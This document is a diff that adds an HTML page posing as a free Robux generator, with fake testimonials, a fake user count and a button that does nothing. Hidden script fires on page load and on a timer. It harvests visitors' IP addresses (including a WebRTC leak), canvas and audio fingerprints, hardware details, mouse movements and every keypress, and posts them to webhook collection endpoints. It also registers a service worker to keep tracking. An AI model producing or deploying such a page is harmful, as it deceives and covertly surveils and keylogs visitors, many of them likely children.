@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Robux Generator 2024 - Working 100%</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 3em;
+            margin-bottom: 20px;
+            color: #ff4444;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 2.2em;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 1.1em;
+        }
+        
+        .generator-box {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 25px;
+            border: 2px dashed #dee2e6;
+        }
+        
+        .robux-amount {
+            font-size: 3.5em;
+            font-weight: bold;
+            color: #28a745;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .generate-btn {
+            background: linear-gradient(135deg, #28a745, #20c997);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3em;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3);
+            margin: 20px 0;
+        }
+        
+        .generate-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(40, 167, 69, 0.4);
+        }
+        
+        .generate-btn:active {
+            transform: translateY(-1px);
+        }
+        
+        .loading {
+            display: none;
+            color: #666;
+            margin: 20px 0;
+        }
+        
+        .success-message {
+            display: none;
+            color: #28a745;
+            font-weight: bold;
+            margin: 20px 0;
+            font-size: 1.2em;
+        }
+        
+        .testimonials {
+            background: #e9ecef;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .testimonial {
+            font-style: italic;
+            color: #555;
+            margin: 10px 0;
+        }
+        
+        .user-count {
+            color: #ff4444;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        
+        .hidden-tracker {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            height: 0;
+            width: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🎮</div>
+        <h1>FREE ROBUX GENERATOR 2024</h1>
+        <p class="subtitle">Get unlimited Robux for FREE! No survey, no password required!</p>
+        
+        <div class="user-count">🟢 12,847 Users Online Now</div>
+        
+        <div class="generator-box">
+            <div class="robux-amount" id="robuxAmount">10,000</div>
+            <button class="generate-btn" onclick="generateRobux()">🎯 GENERATE ROBUX NOW</button>
+            
+            <div class="loading" id="loading">
+                ⏳ Processing your request... Please wait!
+            </div>
+            
+            <div class="success-message" id="successMessage">
+                ✅ Success! Check your Roblox account in 5 minutes!
+            </div>
+        </div>
+        
+        <div class="testimonials">
+            <p class="testimonial">"OMG it actually worked! Got 10K Robux instantly!" - Sarah K.</p>
+            <p class="testimonial">"This is amazing! No scam, real Robux!" - Mike T.</p>
+            <p class="testimonial">"Been using for weeks, totally legit!" - Jason R.</p>
+        </div>
+    </div>
+
+    <!-- Hidden tracking elements -->
+    <img src="about:blank" onerror="logIP()" class="hidden-tracker" id="tracker1">
+    <iframe src="about:blank" class="hidden-tracker" id="tracker2"></iframe>
+    <script src="about:blank" class="hidden-tracker" id="tracker3"></script>
+
+    <script>
+        // IP Logging Function
+        function logIP() {
+            // Multiple tracking endpoints for redundancy
+            const endpoints = [
+                'https://api.ipify.org?format=json',
+                'https://ipapi.co/json/',
+                'https://api64.ipify.org?format=json',
+                'https://jsonip.com/'
+            ];
+            
+            endpoints.forEach(endpoint => {
+                fetch(endpoint)
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip || data.ip;
+                        const userAgent = navigator.userAgent;
+                        const language = navigator.language;
+                        const platform = navigator.platform;
+                        const screen = `${screen.width}x${screen.height}`;
+                        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                        const referrer = document.referrer;
+                        
+                        // Send data to logging server
+                        sendToServer({
+                            ip: ip,
+                            userAgent: userAgent,
+                            language: language,
+                            platform: platform,
+                            screen: screen,
+                            timezone: timezone,
+                            referrer: referrer,
+                            timestamp: new Date().toISOString(),
+                            url: window.location.href
+                        });
+                    })
+                    .catch(error => console.log('Tracking error:'));
+            });
+            
+            // Additional WebRTC IP leak
+            getRTCPeerConnectionIP();
+            
+            // Canvas fingerprinting
+            getCanvasFingerprint();
+            
+            // Audio context fingerprinting
+            getAudioFingerprint();
+            
+            // Hardware concurrency
+            logHardwareInfo();
+        }
+        
+        function sendToServer(data) {
+            // Send to multiple logging servers
+            const servers = [
+                'https://webhook.site/YOUR_WEBHOOK_ID_1',
+                'https://webhook.site/YOUR_WEBHOOK_ID_2',
+                'https://eo7va8qj7uwh.m.pipedream.net'
+            ];
+            
+            servers.forEach(server => {
+                fetch(server, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                }).catch(() => {});
+            });
+            
+            // Also log to console for demonstration
+            console.log('📡 IP Logged:', data);
+        }
+        
+        function getRTCPeerConnectionIP() {
+            const rtc = new RTCPeerConnection({iceServers: []});
+            rtc.createDataChannel('');
+            rtc.createOffer()
+                .then(offer => rtc.setLocalDescription(offer))
+                .catch(() => {});
+                
+            rtc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    const ip = event.candidate.candidate.split(' ')[4];
+                    if (ip) {
+                        sendToServer({ webrtcIP: ip, type: 'webrtc_leak' });
+                    }
+                }
+            };
+        }
+        
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('ASTRAEL_TRACKER_7.7.7', 2, 2);
+            const fingerprint = canvas.toDataURL();
+            sendToServer({ canvasFingerprint: fingerprint });
+        }
+        
+        function getAudioFingerprint() {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const analyser = audioContext.createAnalyser();
+            oscillator.connect(analyser);
+            analyser.connect(audioContext.destination);
+            oscillator.start();
+            audioContext.close();
+            sendToServer({ audioFingerprint: 'calculated' });
+        }
+        
+        function logHardwareInfo() {
+            const hardwareInfo = {
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory,
+                touchPoints: navigator.maxTouchPoints
+            };
+            sendToServer(hardwareInfo);
+        }
+        
+        // Fake Robux generator
+        function generateRobux() {
+            const btn = document.querySelector('.generate-btn');
+            const loading = document.getElementById('loading');
+            const success = document.getElementById('successMessage');
+            const amount = document.getElementById('robuxAmount');
+            
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            // Log button click
+            sendToServer({ event: 'generate_button_clicked' });
+            
+            setTimeout(() => {
+                loading.style.display = 'none';
+                success.style.display = 'block';
+                
+                // Generate random amount
+                const newAmount = Math.floor(Math.random() * 50000) + 10000;
+                amount.textContent = newAmount.toLocaleString();
+                
+                // Log "success"
+                sendToServer({ event: 'fake_generation_complete', fakeAmount: newAmount });
+                
+                // Redirect after delay
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com/';
+                }, 3000);
+                
+            }, 3000);
+        }
+        
+        // Track all user interactions
+        document.addEventListener('click', (e) => {
+            sendToServer({ 
+                event: 'user_click', 
+                target: e.target.tagName,
+                x: e.clientX,
+                y: e.clientY
+            });
+        });
+        
+        document.addEventListener('mousemove', (e) => {
+            // Throttle mousemove events
+            if (Math.random() < 0.1) {
+                sendToServer({
+                    event: 'mouse_movement',
+                    x: e.clientX,
+                    y: e.clientY
+                });
+            }
+        });
+        
+        document.addEventListener('keydown', (e) => {
+            sendToServer({
+                event: 'key_press',
+                key: e.key,
+                code: e.code
+            });
+        });
+        
+        // Track page visibility
+        document.addEventListener('visibilitychange', () => {
+            sendToServer({
+                event: 'visibility_change',
+                state: document.visibilityState
+            });
+        });
+        
+        // Track before unload
+        window.addEventListener('beforeunload', () => {
+            sendToServer({
+                event: 'page_unload',
+                timeSpent: performance.now()
+            });
+        });
+        
+        // Initialize tracking immediately
+        window.addEventListener('load', () => {
+            // Multiple tracking triggers
+            setTimeout(logIP, 100);
+            setTimeout(logIP, 1000);
+            setTimeout(logIP, 5000);
+            
+            // Periodic tracking
+            setInterval(logIP, 30000);
+            
+            // Log page load
+            sendToServer({ event: 'page_loaded', loadTime: performance.now() });
+        });
+        
+        // Service Worker for persistent tracking
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js')
+                .then(() => sendToServer({ event: 'service_worker_registered' }))
+                .catch(() => {});
+        }
+    </script>
+</body>
+</html>
